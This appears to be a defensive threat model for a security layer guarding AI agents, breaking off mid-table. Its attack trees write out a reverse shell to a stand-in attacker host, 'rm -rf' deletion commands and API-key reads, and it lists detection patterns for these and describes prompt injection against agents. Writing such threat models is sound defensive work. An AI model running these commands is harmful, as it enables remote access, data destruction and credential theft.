# OpenClaw Shield — Threat Model

**Document Version:** 1.0.0  
**Last Updated:** 2026-02-11  
**Classification:** Internal / Security-Sensitive  
**Methodology:** STRIDE + Attack Trees

---

## 1. Executive Summary

OpenClaw Shield is a Tier-0 security control designed to protect AI agent deployments from data exfiltration, destructive operations, persistence attacks, and privilege escalation. This threat model identifies critical assets, adversaries, attack vectors, and mitigations implemented by the Shield subsystem.

**Key Principle:** Security > Features > Convenience

---

## 2. System Context

### 2.1 What OpenClaw Shield Protects

OpenClaw Shield operates as a defense layer for AI agents that have:
- File system access (read/write capabilities)
- Network access (HTTP requests, API calls)
- Tool execution rights (shell commands, scripts)
- Access to user environment and credentials

### 2.2 Trust Boundaries

```
┌─────────────────────────────────────────────────────────────┐
│                    UNTRUSTED ZONE                           │
│  - External repositories (npm, PyPI, GitHub)                │
│  - User-provided prompts                                    │
│  - Third-party tool outputs                                 │
│  - Network responses                                        │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│              OPENCLAW SHIELD BOUNDARY                       │
│  ┌─────────────────┐  ┌─────────────────┐                  │
│  │  Static Scanner │  │  Runtime Guard  │                  │
│  │  (Pre-execution)│  │  (Continuous)   │                  │
│  └─────────────────┘  └─────────────────┘                  │
│           │                    │                            │
│           ▼                    ▼                            │
│  ┌─────────────────────────────────────────────────────┐   │
│  │              Policy Engine + Audit Logger            │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                    PROTECTED ZONE                           │
│  - API keys, tokens, credentials                            │
│  - SSH keys, AWS configs                                    │
│  - User documents and data                                  │
│  - Agent memory and context                                 │
│  - System integrity                                         │
└─────────────────────────────────────────────────────────────┘
```

---

## 3. Assets (What We Protect)

### 3.1 Credentials and Secrets

| Asset | Location | Criticality | Impact if Compromised |
|-------|----------|-------------|----------------------|
| API Keys | Environment variables, `.env` files | CRITICAL | Full service access, billing fraud |
| AWS Credentials | `~/.aws/credentials`, env vars | CRITICAL | Cloud infrastructure compromise |
| SSH Keys | `~/.ssh/` | CRITICAL | Server access, lateral movement |
| Private Keys | Various config locations | CRITICAL | Identity theft, signing abuse |
| OAuth Tokens | Config files, keychains | HIGH | Account takeover |
| JWTs | Memory, config files | HIGH | Session hijacking |

### 3.2 Sensitive User Data

| Asset | Location | Criticality | Impact if Compromised |
|-------|----------|-------------|----------------------|
| Documents | User directories | HIGH | Privacy breach, data theft |
| Browser Data | Browser profile directories | HIGH | Session theft, credential exposure |
| Email/Messages | Mail clients, configs | HIGH | Privacy breach, social engineering |
| Financial Data | Various applications | CRITICAL | Financial fraud |

### 3.3 System Integrity

| Asset | Location | Criticality | Impact if Compromised |
|-------|----------|-------------|----------------------|
| Shell Profiles | `~/.bashrc`, `~/.zshrc` | HIGH | Persistence, credential capture |
| LaunchAgents | `~/Library/LaunchAgents/` | HIGH | Persistence, backdoor |
| Cron Jobs | `/etc/cron.*`, user crontab | HIGH | Persistence, scheduled attacks |
| System Configs | `/etc/`, system paths | CRITICAL | System compromise |

### 3.4 Agent Context

| Asset | Location | Criticality | Impact if Compromised |
|-------|----------|-------------|----------------------|
| Agent Memory | Memory files, context | MEDIUM | Information disclosure |
| Tool Permissions | Runtime configuration | HIGH | Privilege escalation |
| Audit Logs | Log files | HIGH | Evidence tampering |

---

## 4. Adversaries

### 4.1 Malicious Repository Author

**Profile:**
- Publishes packages to npm, PyPI, or other registries
- Embeds malicious code in dependencies
- Uses typosquatting or dependency confusion

**Capabilities:**
- Code execution during install (`postinstall` scripts)
- Access to environment variables during build/runtime
- Network access for exfiltration

**Motivation:** Credential theft, cryptomining, botnet recruitment

### 4.2 Supply Chain Compromise

**Profile:**
- Compromises legitimate package maintainer accounts
- Injects malicious code into trusted packages
- Targets widely-used dependencies

**Capabilities:**
- All capabilities of legitimate package
- Trusted by dependency scanners
- Long dwell time before detection

**Motivation:** Large-scale credential harvesting, espionage

### 4.3 Prompt Injection Attacker

**Profile:**
- Crafts malicious content in documents, web pages, or messages
- Exploits agent's instruction-following behavior
- May be automated or targeted

**Capabilities:**
- Influence agent actions through injected instructions
- Bypass user intent
- Trigger unintended tool usage

**Motivation:** Data theft, unauthorized actions, agent manipulation

### 4.4 Insider Threat / Misuse

**Profile:**
- Authorized user with legitimate access
- May intentionally or accidentally cause harm
- Has knowledge of system internals

**Capabilities:**
- Direct tool access
- Knowledge of security controls
- Ability to modify configurations

**Motivation:** Curiosity, malice, accident, coercion

---

## 5. Attack Vectors (STRIDE Analysis)

### 5.1 Spoofing

| Attack | Description | Mitigation |
|--------|-------------|------------|
| Credential Impersonation | Attacker uses stolen API keys | Runtime guard blocks unauthorized credential access |
| Agent Identity Spoofing | Malicious code poses as legitimate tool | Tool allowlist enforcement |

### 5.2 Tampering

| Attack | Description | Mitigation |
|--------|-------------|------------|
| Audit Log Manipulation | Attacker modifies logs to hide activity | Hash-chained audit logs (tamper-evident) |
| Configuration Tampering | Modifying allowlists to permit attacks | Config files should be read-only in production |
| Code Injection | Injecting malicious code via eval/exec | Static scanner detects eval+base64 patterns |

### 5.3 Repudiation

| Attack | Description | Mitigation |
|--------|-------------|------------|
| Action Denial | Attacker denies performing malicious action | Comprehensive audit logging with timestamps |
| Log Deletion | Removing evidence of attack | Append-only logs, external backup recommended |

### 5.4 Information Disclosure

| Attack | Description | Mitigation |
|--------|-------------|------------|
| API Key Exfiltration | Reading env vars + sending to external server | Correlation detection (secret read + network) |
| File Exfiltration | Reading sensitive files + encoding + sending | Path allowlists, network domain restrictions |
| Memory Disclosure | Leaking agent context/secrets in output | Output sanitization with secret redaction |

### 5.5 Denial of Service

| Attack | Description | Mitigation |
|--------|-------------|------------|
| Destructive Deletion | `rm -rf /` or similar | Static detection of dangerous rm patterns |
| Resource Exhaustion | Fork bombs, infinite loops | Out of scope (OS-level controls) |
| Config Corruption | Corrupting critical configs | Write path allowlists |

### 5.6 Elevation of Privilege

| Attack | Description | Mitigation |
|--------|-------------|------------|
| Tool Privilege Expansion | Agent gains access to blocked tools | Tool allowlist enforcement |
| Persistence Installation | LaunchAgent/cron for continued access | Static detection of persistence patterns |
| Shell Profile Backdoor | Modifying .bashrc to capture credentials | Static detection + write path restrictions |

---

## 6. Attack Trees

### 6.1 Credential Theft Attack Tree

```
[GOAL: Steal API Keys]
    │
    ├─[1] Read from Environment
    │   ├─ os.environ.get("OPENAI_API_KEY")
    │   └─ process.env.ANTHROPIC_API_KEY
    │       └─ MITIGATED: env_secret_read detection
    │
    ├─[2] Read from Files
    │   ├─ ~/.aws/credentials
    │   ├─ .env files
    │   └─ Config files
    │       └─ MITIGATED: sensitive_path_access detection + path allowlist
    │
    ├─[3] Read from Keychain
    │   └─ ~/Library/Keychains/
    │       └─ MITIGATED: sensitive_path_access detection
    │
    └─[4] Exfiltrate
        ├─ HTTP POST to attacker server
        ├─ DNS exfiltration
        └─ Encoded in URL parameters
            └─ MITIGATED: network domain allowlist + correlation detection
```

### 6.2 Persistence Attack Tree

```
[GOAL: Maintain Access]
    │
    ├─[1] LaunchAgent (macOS)
    │   └─ Write to ~/Library/LaunchAgents/
    │       └─ MITIGATED: persistence_launch_agents detection
    │
    ├─[2] Cron Job
    │   └─ crontab -e or /etc/cron.d/
    │       └─ MITIGATED: persistence_cron detection
    │
    ├─[3] Shell Profile
    │   ├─ Append to ~/.bashrc
    │   └─ Append to ~/.zshrc
    │       └─ MITIGATED: shell_profile_mod detection + write allowlist
    │
    └─[4] Reverse Shell
        └─ nc -e /bin/bash attacker.com 4444
            └─ MITIGATED: reverse_shell detection (CRITICAL)
```

### 6.3 Data Destruction Attack Tree

```
[GOAL: Destroy Data]
    │
    ├─[1] Direct Deletion
    │   ├─ rm -rf ~/
    │   ├─ rm -rf /
    │   └─ shutil.rmtree("/important/path")
    │       └─ MITIGATED: destructive_rm_rf + destructive_fs_ops detection
    │
    ├─[2] Overwrite
    │   └─ Write garbage to critical files
    │       └─ MITIGATED: write path allowlist
    │
    └─[3] Encryption (Ransomware)
        └─ Encrypt files with attacker key
            └─ MITIGATED: write path allowlist + behavioral anomaly
```

---

## 7. Mitigation Summary

### 7.1 Static Analysis Mitigations

| Pattern | Severity | Detection |
|---------|----------|-----------|
| `env_secret_read` | MEDIUM | Reads suspicious environment variables |
| `sensitive_path_access` | MEDIUM | References ~/.ssh, ~/.aws, keychains |
| `network_activity` | LOW | HTTP calls, external URLs |
| `possible_exfiltration_combo` | CRITICAL | Secret access + network in same file |
| `destructive_rm_rf` | CRITICAL | rm -rf on home/system paths |
| `destructive_fs_ops` | HIGH | shutil.rmtree, os.remove on non-test paths |
| `persistence_launch_agents` | HIGH | LaunchAgent/launchctl references |
| `persistence_cron` | HIGH | Crontab manipulation |
| `shell_profile_mod` | MEDIUM | .bashrc/.zshrc references |
| `reverse_shell` | CRITICAL | nc -e, bash -i, /dev/tcp patterns |
| `listening_socket` | MEDIUM | bind(), listen(), createServer() |
| `obfuscation_eval_base64` | HIGH | base64 + eval/exec combination |
| `obfuscation_long_line` | LOW | Very long JS/TS lines (minified) |

### 7.2 Runtime Guard Mitigations

| Control | Description |
|---------|-------------|
| File Read Allowlist | Only permitted paths can be read |
| File Write Allowlist | Only permitted paths can be written |
| Network Domain Allowlist | Only permitted domains can be contacted |
| Tool Justification | All tool calls require justification |
| Output Sanitization | Secrets redacted from all outputs |
| Audit Logging | All actions logged with hash chain |

---

## 8. Residual Risks

| Risk | Likelihood | Impact | Notes |
|------|------------|--------|-------|
| Zero-day bypass | Low | High | Novel attack patterns not in signatures |
| Obfuscation evasion | Medium | Medium | Sophisticated encoding may evade regex |
| Insider with config access | Low | Critical | Can modify allowlists |
| DNS exfiltration | Medium | Medium | Not fully covered by domain allowlist |
| Time-of-check/time-of-